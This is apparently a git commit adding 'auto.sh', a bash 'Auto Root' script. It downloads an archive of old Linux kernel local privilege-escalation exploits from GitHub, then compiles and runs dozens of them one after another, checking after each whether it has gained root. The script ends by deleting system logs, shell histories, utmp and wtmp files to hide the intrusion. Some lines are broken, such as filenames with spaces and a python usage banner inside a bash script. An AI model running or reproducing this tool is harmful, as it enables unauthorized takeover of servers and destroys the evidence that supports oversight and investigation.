fa812f42c3668a7b0f6a6ae07b066ec327a38f43
eLCrush <absolve186@gmail.com>
2016-06-04 11:50:33 +0700

    Add files via upload

---
+++ Desktop/auto.sh
@@ -0,0 +1,967 @@
+#/bin/bash -x
+
+wget https://github.com/frishella/autoroot/tree/master/Desktop/kernel.zip
+unzip kernel.zip;ls -al
+cd 2001
+ls -a
+chmod 777 2k
+chmod 777 hudo.c
+./2k
+id;whoami
+
+gcc -o hudo hudo.c
+./hudo
+id;whoami
+
+cd 2002
+chmod 777 3b
+chmod 777 4m
+chmod 777 dhcp-expl.c
+chmod 777 w00t.c
+./3b
+id;whoami
+
+./4m
+gcc -o dhcp-expl dhcp-expl.c
+./dhcp-expl
+id;whoami
+
+gcc -o w00t w00t.c
+./w00t
+id;whoami
+
+cd 2003
+ls -a
+id;whoami
+chmod 777 2.4.22-2003
+chmod 777 2-4-21
+chmod 777 48local
+chmod 777 elflbl
+chmod 777 hatorihanzo.c
+chmod 777 ptrace-kmod.c
+
+./2.4.22-2003
+id;whoami
+
+./2-4-21
+id;whoami
+./48local
+id;whoami
+
+./elflbl
+id;whoami
+
+gcc -o hatorihanzo hatorihanzo.c
+./hatorihanzo
+id;whoami
+
+gcc -o ptrace-kmod ptrace-kmod.c
+./ptrace-kmod
+id;whoami
+
+cd 2004
+chmod 777 2.6.13_17_0_2004
+chmod 777 elfcd2.c
+chmod 777 hping.c
+chmod 777 kernel.c
+chmod 777 mremap_pte.c
+chmod 777 pwned
+
+./2.6.13_17_0_2004
+id;whoami
+gcc -o elfcd2 elfcd2.c
+
+./elfcd2
+id;whoami
+gcc -o hping hping.c
+
+./hping
+id;whoami
+gcc -o kernel kernel.c
+
+./kernel
+id;whoami
+gcc -o mremap_pte mremap_pte.c
+
+./mremap_pte
+id;whoami
+
+./pwned
+id;whoami
+
+cd 2005
+chmod 777 1.c
+chmod 777 2.6.9-2005
+chmod 777 2.6.13_17_2_2005
+chmod 777 2.6.27.7- 2.6.18  2.6.24
+chmod 777 binfmt_elf.c
+chmod 777 elfcd1.c
+chmod 777 ex_gpsd.c
+chmod 777 krad
+chmod 777 k-rad.c
+chmod 777 krad2
+chmod 777 k-rad3
+chmod 777 ong_bak.c
+
+gcc -o 1 1.c
+./1
+id;whoami
+
+./elfcd2
+id;whoami
+
+./2.6.9-2005
+id;whoami
+
+./2.6.13_17_2_2005
+id;whoami
+
+./2.6.27.7- 2.6.18  2.6.24
+id;whoami
+
+gcc -o binfmt_elf binfmt_elf.c
+./binfmt_elf
+id;whoami
+
+gcc -o elfcd1 elfcd1.c
+./elfcd1
+id;whoami
+
+gcc -o ex_gpsd ex_gpsd.c
+./ex_gpsd
+id;whoami
+
+./krad
+id;whoami
+
+gcc -o k-rad k-rad.c
+./k-rad
+id;whoami
+
+./krad2
+id;whoami
+
+./k-rad3
+id;whoami
+
+gcc -o ong_bak ong_bak.c
+./ong_bak
+id;whoami
+
+cd 2006
+chmod 777 2.4.21-2006
+chmod 777 2.6.9-42.0.3.ELsmp-2006
+chmod 777 2.6.9-2006
+chmod 777 2.6.13_17_3_2006
+chmod 777 2.6.18
+chmod 777 2.6.18 - 2.6.25 (butuh dikoreksi nama filenya)
+chmod 777 2.6.18.1
+chmod 777 2.6.181
+chmod 777 2.6.x_logrotate_2031
+chmod 777 2.c
+chmod 777 2618
+chmod 777 Linux-2-6-9
+chmod 777 m2
+chmod 777 prct1
+chmod 777 prct2.c
+chmod 777 prct3.c
+chmod 777 prct4
+chmod 777 prct6.c
+
+./2.4.21-2006
+id;whoami
+
+./2.6.9-42.0.3.ELsmp-2006
+id;whoami
+
+./2.6.9-2006
+id;whoami
+
+./2.6.13_17_3_2006
+id;whoami
+
+./2.6.18
+id;whoami
+
+./2.6.18 - 2.6.25
+id;whoami
+
+./2.6.18.1
+id;whoami
+./2.6.181
+id;whoami
+
+./2.6.x_logrotate_2031
+id;whoami
+
+gcc -o 2 2.c
+./2
+id;whoami
+
+./2618
+id;whoami
+
+./Linux-2-6-9
+id;whoami
+
+./m2
+id;whoami
+
+./prct1
+id;whoami
+
+gcc -o prct2 prct2.c
+./prct2
+id;whoami
+
+gcc -o prct3 prct3.c
+./prct3
+id;whoami
+
+./prct4
+id;whoami
+gcc -o prct6 prct6.c
+./prct6
+
+id;whoami
+
+cd 2007
+chmod 777 2.6.9-55-2007
+chmod 777 2.6.11-2.6.24
+chmod 777 2.6.11-2007-priv8
+chmod 777 2.6.18.2
+chmod 777 2.6.18-8-2007
+chmod 777 2.6.22-2007
+chmod 777 2007
+chmod 777 compress
+chmod 777 compress_expl.c1
+chmod 777 gawk
+chmod 777 gawk_expl.c
+chmod 777 w00t.so.1.0
+
+./2.6.9-55-2007
+id;whoami
+
+./2.6.11-2.6.24
+id;whoami
+
+./2.6.11-2007-priv8
+id;whoami
+
+./2.6.18.2
+id;whoami
+
+./2.6.18-8-2007
+id;whoami
+
+./2.6.22-2007
+id;whoami
+
+./2007
+id;whoami
+
+./compress
+id;whoami
+
+gcc -o compress_expl compress_expl.c
+./compress_expl
+id;whoami
+
+./gawk
+id;whoami
+
+gcc -o gawk_expl gawk_expl.c
+./gawk_expl
+id;whoami
+
+./w00t.so.1.0
+id;whoami
+
+cd 2008
+chmod 777 1-2008
+chmod 777 2.4.36.92.6.27.5 - 2008 Local root (butuh dikoreksi nama filenya)
+chmod 777 2.6.8-2008.9-67-2008
+chmod 777 2.6.9
+chmod 777 2.6.9-55-2008-prv8
+chmod 777 2.6.9-67-2008
+chmod 777 2.6.17-2.6.24.1
+chmod 777 2.6.17-18-19-20-24
+chmod 777 2.6.18
+chmod 777 2.6.18-92.1.22.el5.c
+chmod 777 2.6.22-4-686  2008
+chmod 777 2.6.23=2008
+chmod 777 2.6.24=2008
+chmod 777 16
+chmod 777 2008
+chmod 777 2008 2.6.18-92
+chmod 777 local.c
+chmod 777 local2
+
+/.1-2008
+id;whoami
+
+./2.4.36.92.6.27.5 - 2008 Local root (butuh dikoreksi nama filenya)
+id;whoami
+
+./2.6.8-2008.9-67-2008
+id;whoami
+
+./2.6.9
+id;whoami
+
+./2.6.9-55-2008-prv8
+id;whoami
+
+./2.6.9-67-2008
+id;whoami
+
+./2.6.17-2.6.24.1
+id;whoami
+
+./2.6.17-18-19-20-24
+id;whoami
+
+gcc -o 2.6.18-92.1.22.el5 2.6.18-92.1.22.el5.c
+id;whoami
+
+./2.6.18-92.1.22.el5
+id;whoami
+
+./2.6.22
+id;whoami
+
+./2.6.22-4-686  2008 (butuh dikoreksi nama filenya)
+id;whoami
+
+./2.6.23=2008
+id;whoami
+
+./2.6.24=2008
+id;whoami
+
+./16
+id;whoami
+
+./2008
+id;whoami
+
+./2008 2.6.18-92
+id;whoami
+
+./gcc -o local local.c
+./local
+id;whoami
+
+./local2
+id;whoami
+
+cd 2009
+chmod 777 1-2009
+chmod 777 2.4.AnD.2.6-2009
+chmod 777 2.6.17.c
+chmod 777 2.6.18-2009.c
+chmod 777 2.6.23-2009.c
+chmod 777 2.6.28-2009.c
+chmod 777 2.6.29.sh
+chmod 777 2-2009
+chmod 777 2009
+chmod 777 2009.6.18-164
+chmod 777 2009.6.24
+chmod 777 2009.6.31_2009
+chmod 777 dene
+chmod 777 exploit.c
+chmod 777 exploit-pulseaudio.c
+chmod 777 iskorpitx
+chmod 777 keris
+chmod 777 local-root-exploit-gayros.c
+chmod 777 r00t
+chmod 777 rad-e.c
+chmod 777 ror
+chmod 777 run
+chmod 777 runcon-mmap_zero
+chmod 777 sesearch-mmap_zero
+./1-2009
+id;whoami
+
+./2.4.AnD.2.6-2009
+id;whoami
+
+gcc -o 2.6.17 2.6.17.c
+./2.6.17
+id;whoami
+
+gcc -o 2.6.18-2009 2.6.18-2009.c
+./2.6.18-2009
+id;whoami
+
+gcc -o 2.6.23-2009 2.6.23-2009.c
+./2.6.23-2009
+id;whoami
+
+gcc -o 2.6.28-2009 2.6.28-2009.c
+./2.6.29.sh
+id;whoami
+
+./2-2009
+id;whoami
+
+./2009
+id;whoami
+
+./2009.6.18-164
+id;whoami
+
+./2009.6.24
+id;whoami
+
+./2009.6.31_2009
+id;whoami
+
+./dene
+id;whoami
+
+gcc -o exploit exploit.c
+./exploit
+id;whoami
+
+gcc -o exploit-pulseaudio exploit-pulseaudio.c
+./exploit-pulseaudio
+id;whoami
+
+./iskorpitx
+id;whoami
+
+./keris
+id;whoami
+
+./gcc -o local-root-exploit-gayros local-root-exploit-gayros.c
+./local-root-exploit-gayros
+id;whoami
+
+./r00t
+id;whoami
+
+gcc -o rad-e rad-e.c
+./rad-e
+id;whoami
+
+./ror
+id;whoami
+
+./run
+id;whoami
+
+./runcon-mmap_zero
+id;whoami
+
+./sesearch-mmap_zero
+
+cd 2010
+chmod 777 2.6.2-2010.c
+chmod 777 2.6.9
+chmod 777 2.6.13-2010.c
+chmod 777 2.6.18 2010
+chmod 777 2.6.18 2010 x86_64 (butuh dikoreksi nama filenya)
+chmod 777 2.6.18-128
+chmod 777 2.6.18-164-2010
+chmod 777 2.6.18-194.1-2010
+chmod 777 2.6.31 Localr00t Priv8 2010.c (butuh dikoreksi nama filenya)
+chmod 777 2.6.31-2010.c
+chmod 777 2.6.32.c
+chmod 777 2.6.xx
+chmod 777 2010
+chmod 777 2010-1
+chmod 777 abi.c
+chmod 777 ia32syscall
+chmod 777 local2627
+chmod 777 MOTD.c
+chmod 777 priv8-2.6.18-164-2010
+chmod 777 x86_84.c
+
+gcc -o 2.6.2-2010 2.6.2-2010.c
+./2.6.2-2010
+id;whoami
+
+./2.6.9
+id;whoami
+
+gcc -o 2.6.13-2010 2.6.13-2010.c
+./2.6.13-2010.c
+id;whoami
+
+./2.6.18 2010
+id;whoami
+./2.6.18 2010 x86_64
+id;whoami
+
+./2.6.18-128
+id;whoami
+
+./2.6.18-164-2010
+id;whoami
+
+./2.6.18-194.1-2010
+id;whoami
+
+gcc -o 2.6.31 Localr00t Priv8 2010 2.6.31 Localr00t Priv8 2010.c (butuh dikoreksi nama filenya)
+./2.6.31 Localr00t Priv8 2010.c (butuh dikoreksi nama filenya)
+id;whoami
+
+gcc -o 2.6.31-2010 2.6.31-2010.c
+./2.6.31-2010
+id;whoami
+
+gcc -o 2.6.32 2.6.32.c
+./2.6.32
+id;whoami
+
+./2.6.xx
+id;whoami
+
+./2010
+id;whoami
+
+./2010-1
+id;whoami
+
+gcc -o abi abi.c
+./abi
+id;whoami
+
+./ia32syscall
+id;whoami
+
+./local2627
+id;whoami
+
+gcc -o MOTD MOTD.c
+./MOTD.c
+id;whoami
+
+./priv8-2.6.18-164-2010
+id;whoami
+
+./gcc -o x86_84 x86_84.c
+./x86_84.c
+id;whoami
+
+
+cd 2011
+chmod 777 2.6.18.c
+chmod 777 2.6.18_2011.c
+chmod 777 2.6.18-6-x86-2011
+chmod 777 2.6.18-274-2011
+chmod 777 2.6.28-2011
+chmod 777 2.6.33-2011
+chmod 777 2.6.34-2011
+chmod 777 2.6.37.c
+chmod 777 2.6.37-rc2.c
+chmod 777 2.6.43.2.c
+chmod 777 2-6-32-46-2011
+chmod 777 3.0.c
+chmod 777 6.4-2011
+chmod 777 2.6.18-6-x86-2011
+chmod 777 2.6.18-274-2011
+chmod 777 2.6.28-2011
+chmod 777 2.6.33-2011
+chmod 777 2.6.34-2011Exploit1
+chmod 777 2.6.34-2011Exploit2
+gcc -o 2.6.18 2.6.18.c
+./2.6.18.c
+id;whoami
+
+gcc -o 2.6.18_2011 2.6.18_2011.c
+./2.6.18_2011
+id;whoami
+
+./2.6.18-6-x86-2011
+id;whoami
+
+./2.6.18-274-2011
+id;whoami
+
+./2.6.28-2011
+id;whoami
+
+./2.6.33-2011
+id;whoami
+
+./2.6.34-2011
+id;whoami
+
+gcc -o 2.6.37 2.6.37.c
+./2.6.37.c
+id;whoami
+
+gcc -o 2.6.37-rc2 2.6.37-rc2.c
+./2.6.37-rc2.c
+id;whoami
+
+gcc -o 2.6.43.2 2.6.43.2.c
+./2.6.43.2.c
+id;whoami
+
+./2-6-32-46-2011
+id;whoami
+
+gcc -o 3.0 3.0.c
+./3.0.c
+id;whoami
+
+./6.4-2011
+id;whoami
+
+./z1d-2011
+id;whoami
+
+chmod 777 2.6.18-6-x86-2011
+id;whoami
+
+./2.6.18-274-2011
+id;whoami
+
+./2.6.28-2011
+id;whoami
+
+./2.6.33-2011
+id;whoami
+
+./2.6.34-2011Exploit1
+id;whoami
+
+./2.6.34-2011Exploit2
+id;whoami
+
+cd 2012
+chmod 777 2.6.17_2.6.24
+chmod 777 2.6.18.1
+chmod 777 2.6.18.2012.c
+chmod 777 2.6.18-2.6.24-2.6.20-2.6.22-2.6.21.c
+chmod 777 2.6.18-194
+chmod 777 2.6.18-374.12.1.el5-2012
+chmod 777 2.6.33
+chmod 777 2.6.37
+chmod 777 2.6.37-rc2
+chmod 777 2-1
+chmod 777 2-6-37
+chmod 777 3
+chmod 777 4
+chmod 777 5
+chmod 777 7
+chmod 777 7-2
+chmod 777 7x
+chmod 777 8
+chmod 777 9
+chmod 777 10
+chmod 777 11
+chmod 777 13
+chmod 777 14
+chmod 777 16
+chmod 777 16-1
+chmod 777 18
+chmod 777 18-5
+chmod 777 31
+chmod 777 36-rc1
+chmod 777 44
+chmod 777 77
+chmod 777 89
+chmod 777 99
+chmod 777 0977
+chmod 777 15150
+chmod 777 15200
+chmod 777 a.boot
+chmod 777 a.out
+chmod 777 acid
+chmod 777 exp1
+chmod 777 exploit
+chmod 777 full-nelson
+chmod 777 gayros
+chmod 777 hudo.c
+chmod 777 krad313
+chmod 777 local-root-exploit-gayros
+chmod 777 pwnkernel
+chmod 777 root1
+chmod 777 runx
+chmod 777 sec.out
+chmod 777 tivoli
+chmod 777 tivoli
+chmod 777 ubuntu
+chmod 777 vmsplice-local-root-exploit
+
+./2.6.17_2.6.24
+id;whoami
+
+./2.6.18.1
+id;whoami
+
+gcc -o 2.6.18-2.6.24-2.6.20-2.6.22-2.6.21 2.6.18-2.6.24-2.6.20-2.6.22-2.6.21.c
+./2.6.18-2.6.24-2.6.20-2.6.22-2.6.21
+gcc -o 2.6.18.2012 2.6.18.2012.c
+./2.6.18.2012
+id;whoami
+
+./2.6.18-194
+id;whoami
+
+./2.6.18-374.12.1.el5-2012
+id;whoami
+
+./2.6.33
+id;whoami
+
+./2.6.37
+id;whoami
+
+./2.6.37-rc2
+id;whoami
+
+./2-1
+id;whoami
+
+./2-6-37
+id;whoami
+
+./3
+id;whoami
+
+./4
+id;whoami
+
+./5
+id;whoami
+
+./7
+id;whoami
+
+./7-2
+id;whoami
+
+./7x
+id;whoami
+
+./8
+id;whoami
+
+./9
+id;whoami
+
+./10
+id;whoami
+
+./11
+id;whoami
+
+./13x
+id;whoami
+
+./14
+id;whoami
+
+./16
+id;whoami
+
+./16-1
+id;whoami
+
+./18
+id;whoami
+
+./18-5
+id;whoami
+
+./31
+id;whoami
+
+./36-rc1
+id;whoami
+
+./44
+id;whoami
+
+./77
+id;whoami
+
+./89
+id;whoami
+
+./99
+id;whoami
+
+./0977
+id;whoami
+
+./15150
+id;whoami
+
+./15200
+id;whoami
+
+./a.boot
+id;whoami
+
+./a.out
+id;whoami
+
+./acid
+id;whoami
+
+./exp1
+id;whoami
+
+./exploit
+id;whoami
+
+./full-nelson
+id;whoami
+
+./gayros
+id;whoami
+
+gcc -o hudo hudo.c
+./hudo
+id;whoami
+
+./krad313
+id;whoami
+
+./local-root-exploit-gayros
+id;whoami
+
+./pwnkernel
+id;whoami
+
+./root1
+id;whoami
+
+./runx
+id;whoami
+
+./sec.out
+id;whoami
+
+./tivoli
+id;whoami
+
+./trolled
+id;whoami
+
+./ubuntu
+id;whoami
+
+./vmsplice-local-root-exploit
+
+cd 2013
+chmod 777 2.6.17.4_2013
+chmod 777 2.6.32-2013
+chmod 777 a.boot
+chmod 777 2.6.37-3+-2013.c
+chmod 777 3.6,3.8.9-2013.c
+chmod 777 a2.out
+chmod 777 a.out
+chmod 777 sec.out
+chmod 777 trolled
+
+./2.6.17.4_2013
+id;whoami
+
+./2.6.32-2013
+id;whoami
+
+./a.boot
+id;whoami
+
+./a.out
+id;whoami
+
+./sec.out
+id;whoami
+
+gcc -o 2.6.37-3+-2013 2.6.37-3+-2013.c
+./2.6.37-3+-2013.c
+id;whoami
+
+gcc -o 3.6,3.8.9-2013 3.6,3.8.9-2013.c
+./3.6,3.8.9-2013.c
+id;whoami
+
+./a2.out
+id;whoami
+
+./trolled
+id;whoami
+
+./trolled
+
+
+cd other
+cd 2014
+chmod 777 1-2
+chmod 777 2.6.18.371 2014.c
+chmod 777 3.4+.c
+chmod 777 a.boot
+chmod 777 c
+chmod 777 local.c
+
+./1-2
+id;whoami
+
+gcc -o 2.6.18.371 2014 2.6.18.371 2014.c
+./2.6.18.371 2014
+id;whoami
+
+gcc -o 3.4 3.4+.c
+./3.4
+id;whoami
+
+./a.boot
+id;whoami
+
+./c
+id;whoami
+
+gcc -o local local.c
+./local
+id;whoami
+
+cd 2015
+chmod 777 htlover
+
+./htlover
+id;whoami
+
+    echo "#####################################\n"
+    echo "#     Auto Root 2k-2k15             #\n"
+    echo "#        Coded By eLCrush           #\n"
+    echo "#####################################\n"
+    echo "\server rooted ;)"
+    echo "\n./Done";
+
+
+rm -rf /tmp/logs
+rm -rf /root/.ksh_history
+rm -rf /root/.bash_history
+rm -rf /root/.bash_logout
+rm -rf /usr/local/apache/logs
+rm -rf /usr/local/apache/log
+rm -rf /var/apache/logs
+rm -rf /var/apache/log
+rm -rf /var/run/utmp
+rm -rf /var/logs
+rm -rf /var/log
+rm -rf /var/adm
+rm -rf /etc/wtmp
+rm -rf /etc/utmp
+
+
+rm -rf elcrush
+
+
+    echo "#==========================================================#"
+    echo "#              Auto Root By eLCrush                        #"
+    echo "#====================[ Crootz ^_^ ]========================#"
+    echo "#   python "+ __file__ +" -root      For Root                #"
+    echo "#   python "+ __file__ +" -rm       for Remove Log           #"
+    echo "#   python "+ __file__ +" -del     For Remove Local Root     #"
+    echo "#==================[ Thanks For  ]=========================#"
+    echo "#              Arab Security Team and You                  #"
+    echo "#==========================================================#"
